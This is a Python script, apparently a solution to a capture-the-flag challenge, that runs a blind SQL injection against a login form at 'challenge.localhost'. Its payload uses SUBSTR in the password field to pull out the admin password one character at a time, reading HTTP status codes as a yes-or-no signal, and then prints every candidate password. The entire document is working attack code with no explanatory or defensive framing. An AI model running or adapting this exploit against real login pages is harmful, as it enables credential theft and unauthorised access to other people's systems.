import requests
import itertools

# Base URL for the login page
url = "http://challenge.localhost/"

# The characters to test for each position in the password
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_.!@#$%^&*()-+"

# Function to test each character at each position in the password
def check_password_characters():
    # Set the known password length
    password_length = 58
    print(f"Attempting to extract password of length {password_length}...\n")

    # List to store valid characters for each position in the password
    password_possibilities = []

    # Create a session to persist cookies between requests
    session = requests.Session()

    # Iterate over each position in the password
    for i in range(1, password_length + 1):
        print(f"Testing position {i}/{password_length}...")

        # For this position, we test every character in our charset
        possible_chars = []
        for char in charset:
            payload = f'1" OR SUBSTR(password, {i}, 1) = "{char}"-- '
            
            # Send the POST request with the payload as form data
            data = {"username": "admin", "password": payload}
            response = session.post(url, data=data)

            # If the server responds with a 200 or 302 status code, it means this character is correct
            if response.status_code in [200, 302]:
                print(f"Position {i}: Character '{char}' returned {response.status_code}")
                possible_chars.append(char)

        # Store the valid characters for this position
        if possible_chars:
            password_possibilities.append(possible_chars)
            print(f"Position {i} valid characters: {', '.join(possible_chars)}")
        else:
            print(f"No valid characters found for position {i}, something might be wrong.")

    # Now that we have all possibilities for each position, generate and print all combinations
    print("\nPossible password combinations:")
    for combination in itertools.product(*password_possibilities):
        print("".join(combination))

# Run the script
check_password_characters()

